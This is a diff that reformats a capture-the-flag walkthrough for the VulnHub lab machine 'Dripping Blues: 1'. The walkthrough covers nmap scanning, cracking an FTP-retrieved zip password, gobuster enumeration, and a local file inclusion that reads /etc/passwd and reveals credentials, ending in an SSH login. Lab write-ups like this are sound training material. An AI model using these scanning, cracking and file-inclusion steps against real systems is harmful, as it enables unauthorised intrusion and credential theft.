@@ -1,230 +1,241 @@
-<div class="page">
-
 # Dripping Blues: 1
 
-\
+## Machine Information
 
-## 
+- **Machine:** Dripping Blues: 1
+- **Platform:** VulnHub
+- **Download:** https://www.vulnhub.com/entry/dripping-blues-1,744/
 
-## Dripping Blues: 1
+---
 
-- **<span style="color:#663e0e;">Dripping Blues: 1</span>** :-
+# Network Scanning
 
-<!-- -->
+## Find Target IP
 
-- Download the machine :
-  <https://www.vulnhub.com/entry/dripping-blues-1,744/>
+Scan the local network to identify the target machine.
 
-![](images/4-1.png)
-
-- Open ova file .
-- Then click finish .
-- Start the machine .
-
-1.  <span style="color:#3584e4;">Network Scanning</span> :
-
-- Find the machine IP :
-
-<div class="codebox">
-
-    nmap -sn 192.168.2.0/24
-
-</div>
+```bash
+nmap -sn 192.168.2.0/24
+```
 
 ![](images/4-2.png)
 
-- Run nmap master command :
+---
 
-<div class="codebox">
+## Full Nmap Scan
 
-    nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.123
-
-</div>
+```bash
+nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.123
+```
 
 ![](images/4-3.png)
 
-- Find available port in the machine ( Optional ) :
+---
 
-<div class="codebox">
+## Scan All TCP Ports (Optional)
 
-    nmap -v -p- 192.168.2.123
+```bash
+nmap -v -p- 192.168.2.123
+```
 
-</div>
+---
 
-- 
+## Aggressive Scan
 
-<div class="codebox">
+```bash
+nmap -sC -sV -A 192.168.2.123
+```
 
-    nmap -sC -sV -A 192.168.2.123
+This scan performs:
 
-</div>
+- Service detection
+- Version detection
+- OS detection
+- Default NSE scripts
 
-- This command runs an aggressive scan and uses the http-enum script to
-  identify potential CGI directories .
+---
 
-<div class="codebox">
+## HTTP Enumeration
 
-    nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.123
-
-</div>
+```bash
+nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.123
+```
 
 ![](images/4-4.png)
 
-1.  <span style="color:#3584e4;">FTP Enumeration</span> :
+---
 
-- FTP login :
+# FTP Enumeration
 
-<div class="codebox">
+## Connect to FTP
 
-    ftp 192.168.2.123
+```bash
+ftp 192.168.2.123
+```
 
-</div>
+---
 
-- Check the file list :
+## List Files
 
-<div class="codebox">
+```bash
+ls
+```
 
-    ls
+---
 
-</div>
+## Download ZIP File
 
-- Download the file :
-
-<div class="codebox">
-
-    get respectmydrip.zip
-
-</div>
+```bash
+get respectmydrip.zip
+```
 
 ![](images/4-5.png)
 
-- Unzip the file :
+---
 
-<div class="codebox">
+## Extract ZIP Archive
 
-     unzip respectmydrip.zip
+```bash
+unzip respectmydrip.zip
+```
 
-</div>
+Password is required.
 
-![](images/4-6.png) Password required .
+![](images/4-6.png)
 
-- Crack the zip file password :
+---
 
-<div class="codebox">
+## Crack ZIP Password
 
-    zip2john respectmydrip.zip > hash.txt
+Generate the password hash.
 
-</div>
+```bash
+zip2john respectmydrip.zip > hash.txt
+```
 
 ![](images/4-7.png)
 
-- Crack with john :
+Crack the hash using John the Ripper.
 
-<div class="codebox">
-
-    john hash.txt --wordlist=/opt/rockyou.txt
-
-</div>
+```bash
+john hash.txt --wordlist=/opt/rockyou.txt
+```
 
 ![](images/4-8.png)
 
-- Unzip the file :
+---
 
-<div class="codebox">
+## Extract the Archive Again
 
-    unzip respectmydrip.zip
+```bash
+unzip respectmydrip.zip
+```
 
-</div>
+Read the extracted file.
 
-- Read the txt file :
-
-<div class="codebox">
-
-    cat respectmydrip.txt
-
-</div>
+```bash
+cat respectmydrip.txt
+```
 
 ![](images/4-9.png)
 
-1.  <span style="color:#3584e4;">Web Enumeration</span> :
+---
 
-- IP visit in browser : <http://192.168.2.123/>
-  <http://192.168.2.123/robots.txt>
-  <http://192.168.2.123/dripisreal.txt>
+# Web Enumeration
+
+Visit:
+
+```
+http://192.168.2.123/
+http://192.168.2.123/robots.txt
+http://192.168.2.123/dripisreal.txt
+```
 
 ![](images/4-10.png)
 
-- Run the gobuster for find the directory :
+---
 
-<div class="codebox">
+## Directory Bruteforce
 
-    gobuster dir -u http://192.168.2.123 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -t 50
-
-</div>
+```bash
+gobuster dir \
+-u http://192.168.2.123 \
+-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+-x php,txt,html \
+-t 50
+```
 
 ![](images/4-11.png)
 
-- Visit the index.php directory : <http://192.168.2.123/index.php>
+---
 
-<!-- -->
+## Local File Inclusion (LFI)
 
-- This is LFI based now find the parameter :
+Browse to:
 
-<div class="codebox">
+```
+http://192.168.2.123/index.php
+```
 
-    wfuzz -u 'http://192.168.2.123/index.php?FUZZ=/etc/passwd' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hw 21
+Identify the vulnerable parameter.
 
-</div>
+```bash
+wfuzz -u 'http://192.168.2.123/index.php?FUZZ=/etc/passwd' \
+-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+--hw 21
+```
 
 ![](images/4-12.png)
 
-- Visit the parameter and call the file :
-  <http://192.168.2.123/index.php?drip=/etc/passwd>
+Test the parameter.
+
+```
+http://192.168.2.123/index.php?drip=/etc/passwd
+```
 
 ![](images/4-13.png)
 
-- Now call the file from the robots.txt endpoints :
-  <http://192.168.2.123/index.php?drip=/etc/dripispowerful.html>
+Load the file referenced in `robots.txt`.
+
+```
+http://192.168.2.123/index.php?drip=/etc/dripispowerful.html
+```
 
 ![](images/4-14.png)
 
-- View the source code :
+View the page source.
 
-<div class="codebox">
-
-    view-source:http://192.168.2.123/index.php?drip=/etc/dripispowerful.html
-
-</div>
+```text
+view-source:http://192.168.2.123/index.php?drip=/etc/dripispowerful.html
+```
 
 ![](images/4-15.png)
 
-- Password Found :
+---
 
-<div class="codebox">
+## Credentials Discovered
 
-    imdrippinbiatch
+Password:
 
-</div>
+```text
+imdrippinbiatch
+```
 
-- Username is given through the hint :
+Possible usernames:
 
-<div class="codebox">
+```text
+travisscott
+thugger
+```
 
-    travisscott 
-    thugger
+---
 
-</div>
+# SSH Access
 
-1.  SSH Access :
+Connect via SSH.
 
-- Try to login ssh :
-
-<div class="codebox">
-
-    ssh thugger@192.168.2.123
-
-</div>
+```bash
+ssh thugger@192.168.2.123
+```
 
 ![](images/4-16.png)
-
-</div>
